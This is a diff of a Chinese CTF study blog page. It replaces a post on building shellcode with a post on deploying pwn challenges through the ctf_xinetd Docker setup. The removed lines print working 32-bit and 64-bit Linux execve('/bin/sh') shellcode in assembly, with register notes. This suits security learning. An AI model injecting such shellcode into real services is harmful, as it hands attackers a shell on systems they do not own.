@@ -16,20 +16,20 @@
   <meta name="author" content="Cheer">
   <meta name="keywords" content="">
   
-    <meta name="description" content="32位shellcode: 12345678xor    ecx,ecx;mul    ecx;push   ecx;push   0x68732f2f;push   0x6e69622f;mov    ebx,esp;mov    al,0xb;int    0x80;  32位机器的系统调用，调用号在EAX，前面的参数依次在EBX, ECX, EDX 其中，mul ecx;指令的作用为EDX:">
+    <meta name="description" content="根据助教老师的提示，使用ctf_xinetd框架 使用README.md中的方法，无法复现：原可执行程序的功能是打印”Hello ctf_xinetd”之后开shell，但是开容器后，用nc连接时没有Hello信息，可以正常开shell。 执行exit无法直接退出，反而打印了Hello信息。然后多次键入回车后会退出。推测多次键入回车是退出时的确认。 因此将打印信息删除了，直接进行注入和执行。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Pwn笔记 shellcode的构建">
-<meta property="og:url" content="http://example.com/2022/04/13/Pwn%E7%AC%94%E8%AE%B0%20shellcode%E7%9A%84%E6%9E%84%E5%BB%BA/index.html">
+<meta property="og:title" content="Pwn题目的docker部署">
+<meta property="og:url" content="http://example.com/2022/04/14/Pwn%E9%A2%98%E7%9B%AE%E7%9A%84docker%E9%83%A8%E7%BD%B2/index.html">
 <meta property="og:site_name" content="UCASCheer">
-<meta property="og:description" content="32位shellcode: 12345678xor    ecx,ecx;mul    ecx;push   ecx;push   0x68732f2f;push   0x6e69622f;mov    ebx,esp;mov    al,0xb;int    0x80;  32位机器的系统调用，调用号在EAX，前面的参数依次在EBX, ECX, EDX 其中，mul ecx;指令的作用为EDX:">
+<meta property="og:description" content="根据助教老师的提示，使用ctf_xinetd框架 使用README.md中的方法，无法复现：原可执行程序的功能是打印”Hello ctf_xinetd”之后开shell，但是开容器后，用nc连接时没有Hello信息，可以正常开shell。 执行exit无法直接退出，反而打印了Hello信息。然后多次键入回车后会退出。推测多次键入回车是退出时的确认。 因此将打印信息删除了，直接进行注入和执行。">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-04-13T02:53:23.701Z">
-<meta property="article:modified_time" content="2022-04-14T15:58:43.760Z">
+<meta property="article:published_time" content="2022-04-14T10:02:28.281Z">
+<meta property="article:modified_time" content="2022-04-17T01:02:59.315Z">
 <meta property="article:author" content="Cheer">
 <meta name="twitter:card" content="summary_large_image">
   
   
-  <title>Pwn笔记 shellcode的构建 - UCASCheer</title>
+  <title>Pwn题目的docker部署 - UCASCheer</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -175,7 +175,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Pwn笔记 shellcode的构建">
+            <span class="h2" id="subtitle" title="Pwn题目的docker部署">
               
             </span>
 
@@ -185,8 +185,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-04-13 10:53" pubdate>
-        April 13, 2022 am
+      <time datetime="2022-04-14 18:02" pubdate>
+        April 14, 2022 pm
       </time>
     </span>
   
@@ -196,7 +196,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      427 字
+      193 字
     </span>
   
 
@@ -205,7 +205,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      4 分钟
+      2 分钟
     </span>
   
 
@@ -234,23 +234,13 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Pwn笔记 shellcode的构建</h1>
+            <h1 style="display: none">Pwn题目的docker部署</h1>
             
             <div class="markdown-body">
-              <p>32位shellcode:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><pre><code class="hljs assembly">xor    ecx,ecx;<br>mul    ecx;<br>push   ecx;<br>push   0x68732f2f;<br>push   0x6e69622f;<br>mov    ebx,esp;<br>mov    al,0xb;<br>int    0x80;<br></code></pre></td></tr></table></figure>
-
-<p>32位机器的系统调用，调用号在EAX，前面的参数依次在EBX, ECX, EDX</p>
-<p>其中，<code>mul ecx;</code>指令的作用为<code>EDX:EAX &lt;-- EAX * r/m32</code>，将EDX和EAX清零。</p>
-<p>64位shellcode：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor     rdx, rdx<br>mov     qword rbx, &#x27;//bin/sh&#x27;<br>shr     rbx, 0x8<br>push    rbx<br>mov     rdi, rsp<br>push    rax<br>push    rdi<br>mov     rsi, rsp<br>mov     al, 0x3b<br>syscall<br></code></pre></td></tr></table></figure>
-
-<p>64位机器系统调用，调用号在RAX，前面的参数依次在RDI, DSI, RDX, RCX</p>
-<p>假设开始时rax为零了</p>
-<p>且rcx为零不需要保证</p>
-<p>使用pwntools可以把其中的AT&amp;T转换成intel风格。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly"><br></code></pre></td></tr></table></figure>
-
+              <p>根据助教老师的提示，使用ctf_xinetd框架</p>
+<p>使用README.md中的方法，无法复现：原可执行程序的功能是打印”Hello ctf_xinetd”之后开shell，但是开容器后，用nc连接时没有Hello信息，可以正常开shell。</p>
+<p>执行exit无法直接退出，反而打印了Hello信息。然后多次键入回车后会退出。推测多次键入回车是退出时的确认。</p>
+<p>因此将打印信息删除了，直接进行注入和执行。</p>
 
             </div>
             <hr>
@@ -278,9 +268,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/04/14/Pwn%E7%AC%94%E8%AE%B0%20%E9%A2%98%E7%9B%AE%E7%9A%84docker%E9%83%A8%E7%BD%B2/">
+                      <a href="/2022/05/02/%E9%A1%B6%E5%B0%96%E9%BB%91%E5%AE%A2%E7%9A%84%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Pwn笔记 题目的docker部署</span>
+                        <span class="hidden-mobile">顶尖黑客的软件安全研究</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -288,8 +278,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/04/12/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AE%B0%E5%BD%95%EF%BC%9A%E5%9F%BA%E4%BA%8ELLVMClang%E7%BC%96%E8%AF%91%E5%99%A8%E4%BD%BF%E7%94%A8%E5%8F%8A%E7%BC%96%E8%AF%91%E6%96%B9%E6%A1%88%E4%BC%98%E5%8C%96/">
-                        <span class="hidden-mobile">编译原理记录：基于LLVM/Clang编译器使用及编译方案优化</span>
+                      <a href="/2022/04/13/Pwn%E4%B8%ADshellcode%E7%9A%84%E6%9E%84%E5%BB%BA/">
+                        <span class="hidden-mobile">Pwn中shellcode的构建</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
